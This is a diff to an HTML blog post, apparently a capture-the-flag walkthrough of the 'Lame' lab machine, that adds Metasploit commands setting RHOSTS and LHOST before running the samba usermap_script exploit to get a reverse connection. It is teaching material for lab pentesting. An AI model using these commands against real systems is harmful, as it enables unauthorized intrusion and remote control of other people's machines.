@@ -82,11 +82,15 @@
           
           <br><br><img src="../images/lame-module-options.png" alt="Post image" class="featured-image" /> <br>
           
-        <p>In the context of pentesting, LHOST refers to the <strong>local host</strong> - specifically, the address of your
+          <p>In the context of pentesting, LHOST refers to the <strong>local host</strong> - specifically, the address of your
           machine. RHOSTS refers to the <strong>target</strong> machine. When you use Metasploit to exploit a target, you often need
-          to establish a reverse connection from the target back to your machine. <br> After all of that has been set, you can 
-          now run the exploit. </p>
+          to establish a reverse connection from the target back to your machine. 
+          <br>
+          
+          <pre><code> set RHOSTS 10.10.10.3 <br> set LHOST [Your address] </code></pre>
         
+          <br> After all of that has been set, you can 
+          now run the exploit. </p>
         <pre><code>msf6 exploit(multi/samba/usermap_script) > <strong>run</strong></code></pre>
         
         <p>And just like that, you are now remotely connected to the target machine. </p>
